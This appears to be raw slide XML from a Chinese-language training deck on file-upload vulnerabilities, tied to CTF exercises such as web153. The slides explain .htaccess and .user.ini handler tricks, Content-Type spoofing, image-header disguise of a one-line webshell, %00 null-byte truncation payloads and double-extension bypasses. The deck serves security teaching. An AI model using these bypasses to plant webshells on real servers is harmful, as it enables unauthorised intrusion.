      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="64" name="Right Triangle 1"/>
          <p:cNvSpPr/>
          <p:nvPr>
            <p:custDataLst>
              <p:tags r:id="rId6"/>
            </p:custDataLst>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5156202" y="4302635"/>
            <a:ext cx="7035797" cy="2555363"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst>
              <a:gd name="connsiteX0" fmla="*/ 7035796 w 7035797"/>
              <a:gd name="connsiteY0" fmla="*/ 0 h 2697102"/>
              <a:gd name="connsiteX1" fmla="*/ 7035797 w 7035797"/>
              <a:gd name="connsiteY1" fmla="*/ 2697101 h 2697102"/>
              <a:gd name="connsiteX2" fmla="*/ 0 w 7035797"/>
              <a:gd name="connsiteY2" fmla="*/ 2697102 h 2697102"/>
            </a:gdLst>
            <a:ahLst/>
            <a:cxnLst>
              <a:cxn ang="0">
                <a:pos x="connsiteX0" y="connsiteY0"/>
              </a:cxn>
              <a:cxn ang="0">
                <a:pos x="connsiteX1" y="connsiteY1"/>
              </a:cxn>
              <a:cxn ang="0">
                <a:pos x="connsiteX2" y="connsiteY2"/>
              </a:cxn>
            </a:cxnLst>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="7035797" h="2697102">
                <a:moveTo>
                  <a:pt x="7035796" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="7035797" y="2697101"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="26971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kumimoji="1" lang="zh-CN" altLang="en-US" sz="1600" b="1">
              <a:solidFill>
                <a:srgbClr val="FFFFFF"/>
              </a:solidFill>
              <a:latin typeface="微软雅黑" panose="020B0503020204020204" charset="-122"/>
              <a:ea typeface="微软雅黑" panose="020B0503020204020204" charset="-122"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="80" name="Right Triangle 18"/>
          <p:cNvSpPr/>
          <p:nvPr>
            <p:custDataLst>
              <p:tags r:id="rId7"/>
            </p:custDataLst>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="26" y="8"/>
            <a:ext cx="7035793" cy="2697104"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst>
              <a:gd name="connsiteX0" fmla="*/ 0 w 7035793"/>
              <a:gd name="connsiteY0" fmla="*/ 0 h 2697104"/>
              <a:gd name="connsiteX1" fmla="*/ 7035793 w 7035793"/>
              <a:gd name="connsiteY1" fmla="*/ 1 h 2697104"/>
              <a:gd name="connsiteX2" fmla="*/ 1 w 7035793"/>
              <a:gd name="connsiteY2" fmla="*/ 2697104 h 2697104"/>
            </a:gdLst>
            <a:ahLst/>
            <a:cxnLst>
              <a:cxn ang="0">
                <a:pos x="connsiteX0" y="connsiteY0"/>
              </a:cxn>
              <a:cxn ang="0">
                <a:pos x="connsiteX1" y="connsiteY1"/>
              </a:cxn>
              <a:cxn ang="0">
                <a:pos x="connsiteX2" y="connsiteY2"/>
              </a:cxn>
            </a:cxnLst>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="7035793" h="2697104">
                <a:moveTo>
                  <a:pt x="0" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="7035793" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="2697104"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:schemeClr val="accent5">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kumimoji="1" lang="zh-CN" altLang="en-US" sz="1600" b="1">
              <a:solidFill>
                <a:srgbClr val="FFFFFF"/>
              </a:solidFill>
              <a:latin typeface="微软雅黑" panose="020B0503020204020204" charset="-122"/>
              <a:ea typeface="微软雅黑" panose="020B0503020204020204" charset="-122"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="矩形 19"/>
          <p:cNvSpPr/>
          <p:nvPr>
            <p:custDataLst>
              <p:tags r:id="rId8"/>
            </p:custDataLst>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457204" y="6367871"/>
            <a:ext cx="11226890" cy="105319"/>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21" name="矩形 20"/>
          <p:cNvSpPr/>
          <p:nvPr>
            <p:custDataLst>
              <p:tags r:id="rId9"/>
            </p:custDataLst>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457152" y="457200"/>
            <a:ext cx="11226890" cy="2232647"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="lt2"/>
          </a:solidFill>
          <a:ln w="1905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22" name="矩形 21"/>
          <p:cNvSpPr/>
          <p:nvPr>
            <p:custDataLst>
              <p:tags r:id="rId10"/>
            </p:custDataLst>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457204" y="2682247"/>
            <a:ext cx="11226890" cy="3540803"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="dk2"/>
          </a:solidFill>
          <a:ln w="19050">
            <a:solidFill>
              <a:schemeClr val="dk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23" name="Title 6"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:custDataLst>
              <p:tags r:id="rId11"/>
            </p:custDataLst>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1219162" y="762006"/>
            <a:ext cx="9753676" cy="1615427"/>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55600" lvl="0" indent="-355600" algn="l" fontAlgn="ctr">
              <a:lnSpc>
                <a:spcPct val="120000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" charset="0"/>
              <a:buChar char="l"/>
            </a:pP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&lt;FilesMatch "</a:t>
            </a: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文件名"&gt;</a:t>
            </a:r>
            <a:endPar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55600" lvl="0" indent="-355600" algn="l" fontAlgn="ctr">
              <a:lnSpc>
                <a:spcPct val="120000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" charset="0"/>
              <a:buChar char="l"/>
            </a:pP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SetHandler application/x-httpd-php</a:t>
            </a:r>
            <a:endPar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55600" lvl="0" indent="-355600" algn="l" fontAlgn="ctr">
              <a:lnSpc>
                <a:spcPct val="120000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" charset="0"/>
              <a:buChar char="l"/>
            </a:pP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&lt;/FilesMatch&gt;</a:t>
            </a:r>
            <a:endPar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4" name="Title 6"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:custDataLst>
              <p:tags r:id="rId12"/>
            </p:custDataLst>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1219200" y="2987049"/>
            <a:ext cx="9753676" cy="295659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20000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" charset="0"/>
              <a:buNone/>
            </a:pP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.htaccess</a:t>
            </a:r>
            <a:b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b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.htaccess 文件 可以对目录改变配置方法。 就是在一个特定的目录防止一个包含一条或多条指令的文件  以作用于此目录和所有子目录。 作为用户，能用的命令受到限制，管理员可以通过  Apache的 AllowOverride 来配置 开启或关闭。</a:t>
            </a:r>
            <a:endPar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0" lvl="0" indent="-285750" algn="l" fontAlgn="ctr">
              <a:lnSpc>
                <a:spcPct val="120000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" charset="0"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <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总结下来的经验就是更改Apache里的.htaccess的配置。可以将其它类型的文件转化为PHP的文件类型。</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2000" spc="12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85875" y="1214755"/>
            <a:ext cx="6096000" cy="645160"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0" anchor="t">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>上传htaccess文件==》上传符合我们重新后规则的文件==》蚁剑连接</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN"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90575" y="633730"/>
            <a:ext cx="7964170" cy="368300"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>.usre.ini</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>作用与</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>.htaccess</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>类似</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="文本框 2"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="661670" y="1701165"/>
            <a:ext cx="6096000" cy="1476375"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0" anchor="t">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>auto_append_file在木马文件上传后上传</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>      auto_prepend_file在木马文件上传前上传</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="文本框 3"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1662430" y="5215255"/>
            <a:ext cx="6096000" cy="368300"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0" anchor="t">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>web153 </a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="文本框 4"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3777615" y="633730"/>
            <a:ext cx="6096000" cy="645160"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0" anchor="t">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>通过.user.ini使得upload文件夹下每个php文件在文件头都包含1.png文件</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN"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625" y="55245"/>
            <a:ext cx="9096375" cy="5773420"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0" anchor="t">
            <a:noAutofit/>
          </a:bodyPr>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800"/>
              <a:t>MIME</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2800"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2800"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800"/>
              <a:t>MIME:客户端软件，区分不同种类的数据，例如web浏览器就是通过MIME类型来判断文件是GIF图片，还是可打印的PostScript文件。web服务器使用MIME来说明发送数据的种类， web客户端使用MIME来说明希望接收到的数据种类。</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2800"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2800"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800"/>
              <a:t>MIME检测原理</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2800"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2800"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800"/>
              <a:t>服务端MIME类型检测是通过检查http包的Content-Type字段中的值来判断上传文件是否合法的。</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2800"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2800"/>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0"/>
            <a:ext cx="6096000" cy="3138170"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0" anchor="t">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>MIME(Multipurpose Internet MailExtensions)多用途互联网邮件扩展类型。</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>● 是设定某种扩展名的文件用一种应用程序来打开的方式类型，当该扩展名文件被访问的时候，浏览器会自动使用指定应用程序来打开。</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>● 多用于指定一些客户端自定义的文件名，以及一些媒体文件打开方式。</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>● MIME 消息能包含文本、图像、音频、视频以及其他应用程序专用的数据。</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>常见的M</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>I</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>ME类型，例如：</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="文本框 2"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6096000" y="1096010"/>
            <a:ext cx="6096000" cy="5354320"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0" anchor="t">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>#text表明文件是普通文本</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>text/plain</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>text/html</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>#image表明是某种图像或者动态图(gif)</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>image/jpeg</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>image/png</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US">
                <a:sym typeface="+mn-ea"/>
              </a:rPr>
              <a:t>image/gif</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>#audio表明是某种音频文件</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>audio/mpeg</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>audio/ogg</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>audio/*</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>#video表明是某种视频文件</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>video/mp4</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>#application表明是某种二进制数据</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>application/*</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>application/json</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>application/javascript</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>application/ecmascript</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>application/octet-stream</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>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31570" y="775335"/>
            <a:ext cx="6096000" cy="645160"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0" anchor="t">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>上传一句话木马==》burp抓包==》更改Content-Type类型为：image/png==&gt;放包</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>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35" y="635"/>
            <a:ext cx="9144635" cy="6105525"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0" anchor="t">
            <a:noAutofit/>
          </a:bodyPr>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800"/>
              <a:t>文件头检测：</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2800"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800"/>
              <a:t>我们要上传.php，但是他会对文件头进行检测。</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2800"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2800"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800"/>
              <a:t>文件头检测是使用对于 文件内容 的验证机制，这种方法利用的是：每一个特定类型的文件都会有不太一样的开头或者标志位来表明它们的文件类型,也就是文件幻数。文件幻数：可以用来标记文件 或者协议的格式 ，很多文件都有幻数标志来表明该文件的格式。</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2800"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2800"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800"/>
              <a:t>像题目里只允许jpg,png,gif，所以我们可以把木马输入一个用txt打开的简单的png图片里，上传后再抓包修改文件后缀名。</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2800"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2800"/>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35" y="0"/>
            <a:ext cx="12192000" cy="5274945"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0" anchor="t">
            <a:noAutofit/>
          </a:bodyPr>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="3600"/>
              <a:t>00截断是操作系统层的漏洞，由于操作系统是C语言或汇编语言编写的，这两种语言在定义字符串时，都是以\0（即0x00）作为字符串的结尾。操作系统在识别字符串时，当读取到\0字符时，就认为读取到了一个字符串的结束符号。因此，我们可以通过修改数据包，插入\0字符的方式，达到字符串截断的目的。00截断通常用来绕过web软waf的白名单限制。</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="3600"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="3600"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="文本框 2"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="615315" y="4485005"/>
            <a:ext cx="6096000" cy="2030095"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0" anchor="t">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>0x00是字符串的结束标识符，攻击者可以利用手动添加字符串标识符的方式来将后面的内容进行截断，而后面的内容又可以帮助我们绕过检测。</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>数据包中必须含有上传后文件的目录情况才可以用，比如数据包中存在path: uploads/，那么攻击者可以通过修改path的值来构造paylod: uploads/aa.php%00</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>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6830" y="0"/>
            <a:ext cx="6096000" cy="3415030"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0" anchor="t">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>原理</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>%00表示截断，</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>例如：</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>？filename=123.txt                输出的是123.txt文件</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>加上%00后</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>？filename=123.php%00.txt        后缀为.txt，但是输出的是.php，因为00截断了后面</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>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635"/>
            <a:ext cx="9144000" cy="4027805"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0" anchor="t">
            <a:noAutofit/>
          </a:bodyPr>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="3600"/>
              <a:t>双写绕过原理：服务端对黑名单中的内容进行处理，且仅处理一次，所以可以通过双写后缀绕过．</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="3600"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="3600"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="3600"/>
              <a:t>如，黑名单中有＂php＂字样，上传文件名为＂1.php＂ 上传后文件变成＂1.＂．</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="3600"/>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0"/>
            <a:ext cx="7183755" cy="2429510"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0" anchor="t">
            <a:noAutofit/>
          </a:bodyPr>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>php文件后缀替换</a:t>
            </a:r>
